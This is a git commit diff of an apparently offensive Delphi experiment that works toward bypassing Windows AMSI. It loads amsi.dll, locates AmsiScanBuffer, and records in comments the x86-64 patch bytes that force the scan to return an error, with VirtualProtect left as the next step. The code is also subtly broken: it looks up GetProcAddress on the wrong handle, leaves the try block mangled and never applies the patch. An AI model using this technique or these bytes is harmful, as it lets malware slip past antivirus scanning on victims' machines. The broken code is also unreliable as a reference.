b0bcbb586d86f51a7b59976b11aa0c071c31d3fb
p4yl0ad <p4yl0ad@protonmail.com>
2021-07-24 13:58:57 +0100

    updated amsi patch with dll loads

--- Experiments/BasedAmsi_E/BasedAmsi_E.dpr
+++ Experiments/BasedAmsi_E/BasedAmsi_E.dpr
@@ -6,32 +6,53 @@ program BasedAmsi_E;
 
 uses
   SysUtils,
-  //Vcl.Controls,
   Windows,
   Vcl.Forms;
 
 var
-  HDLLInst : THandle;
+  amsee,kersee : THandle;
+  amsibaseaddr : pointer;
 
-
+{http://docwiki.embarcadero.com/RADStudio/Sydney/en/Libraries_and_Packages_(Delphi)}
 {https://github.com/rasta-mouse/AmsiScanBufferBypass/blob/main/AmsiBypass.cs}
+//x86-64 ret 0xC3
+//x86-64 patch 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3
+
 
 begin
   try
     // Load amsi.dll , find AmsiScanBuffer
-    HDLLInst := SafeLoadLibrary('C:\\Windows\\System32\\amsi.dll');
-    WriteLn(
-      Format(
-        'amsi.dll base address: %p',[GetProcAddress(HDLLInst,'AmsiScanBuffer')]
-      )
-    );
-    FreeLibrary (HDLLInst);
+    amsee := SafeLoadLibrary('C:\\Windows\\System32\\amsi.dll');
+    if amsee <> 0 then
+    begin
+      amsibaseaddr := GetProcAddress(amsee,'AmsiScanBuffer');
+      WriteLn(Format('amsi.dll base address: %p',[amsibaseaddr]));
+    end;
+
+    kersee := SafeLoadLibrary('C:\\Windows\\System32\\kernel32.dll');
+    if kersee <> 0 then
+    begin
+      amsibaseaddr := GetProcAddress(amsee,'GetProcAddress');
+    end
+
+    else
+    begin
+    WriteLn('Failed to load');
+    end
+
+
+    //procedure VirtualProtect
+    finally
+
+      FreeLibrary(amsee);
+    end;
+    end.
 
 
 
     //WriteLn(IntToHex (DWORD ( GetProcAddress (GetModuleHandle ('amsi.dll'), 'MessageBoxA')), 8));
-  except
-    on E: Exception do
-      Writeln(E.ClassName, ': ', E.Message);
-  end;
-end.
+  //except
+    //on E: Exception do
+      //Writeln(E.ClassName, ': ', E.Message);
+  //end;
+//end.
